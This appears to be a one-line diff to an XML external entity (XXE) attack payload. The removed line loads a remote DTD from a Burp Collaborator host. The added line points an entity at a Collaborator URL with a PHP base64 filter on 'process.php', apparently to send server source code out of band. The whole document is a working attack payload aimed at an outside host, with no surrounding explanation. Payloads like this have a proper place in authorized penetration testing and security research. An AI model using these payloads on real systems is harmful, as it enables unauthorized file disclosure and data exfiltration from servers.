@@ -1,1 +1,1 @@
-<!ENTITY % eval SYSTEM "https://fzix8cvhr02xmub1ewdz8ue42v8lwa.burpcollaborator.net/">%eval;
+<!ENTITY % files SYSTEM "https://zx.1celh9920n7vfh7lwr5y5v3uqlwgk5.burpcollaborator.net?php://filter/convert.base64-encode/resource=process.php">
